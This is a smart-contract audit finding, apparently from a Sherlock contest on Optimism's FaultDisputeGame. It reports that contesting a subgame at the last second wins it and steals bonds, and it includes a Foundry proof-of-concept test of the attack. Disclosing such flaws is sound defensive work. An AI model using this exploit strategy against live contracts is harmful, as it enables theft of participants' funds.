Flat Fleece Snail

high

# Subgames can be won at the last second

## Summary

Subgames can be won at the last second

## Vulnerability Detail

There is a strategy to win subgames by contesting the subgame at the last second of the expiration of the subgame root's clock. When this happens, the newly added attacker node will be uncountered because the opponent cannot react fast enough, and therefore the root node will be countered. 

The condition for a subgame to be resolvable is that the time of contesting the subgame root plus the parent clock duration must be greater than the GAME_DURATION / 2.

[FaultDisputeGame.sol#L411-L417](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L411-L417)
```solidity
        uint64 parentClockDuration = parent.clock.duration().raw();
        uint64 timeSinceParentMove = uint64(block.timestamp) - parent.clock.timestamp().raw();
        if (parentClockDuration + timeSinceParentMove <= GAME_DURATION.raw() >> 1) {
            revert ClockNotExpired();
        }
```

This effectively means the contest of the subgame can be at the last second and the opponent cannot react fast enough.

Therefore it would be possible to win the subgames and the bonds these way. Attached is a Foundry PoC documenting this strategy.

```solidity
    function test_resolve_frontrunResolution() public {
        Claim claim = _dummyClaim();
        uint256 firstBond = _getRequiredBond(0);
        vm.deal(address(this), firstBond);
        gameProxy.attack{ value: firstBond }(0, claim);

        uint256 secondBond = _getRequiredBond(1);
        vm.deal(address(this), secondBond);
        gameProxy.attack{ value: secondBond }(1, _dummyClaim());

        // Setup our attacker
        address attacker = address(0xDEADBEEF);

        // Oh, oh, attacker contests it at the last second
        vm.warp(block.timestamp + 3 days + 11 hours + 59 minutes + 59 seconds);
        uint256 thirdBond = _getRequiredBond(2);
        vm.deal(attacker, thirdBond);

        vm.prank(attacker);
        gameProxy.attack{ value: thirdBond }(2, _dummyClaim());

        // Don't have time to react
        vm.warp(block.timestamp + 2 seconds);

        // Attacker claims both bonds.
        gameProxy.resolveClaim(3);
        gameProxy.resolveClaim(2);
 
        // Wait for the withdrawal delay.
        vm.warp(block.timestamp + delayedWeth.delay() + 1 seconds);

        gameProxy.claimCredit(attacker);
        assertEq(attacker.balance, _getRequiredBond(1) + _getRequiredBond(2));
    }
```
## Impact

Always win a subgame and theft of bonds

## Code Snippet

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L411-L417

## Tool used

Manual Review / Foundry

## Recommendation

Come up with another way for subgames to be able to resolved.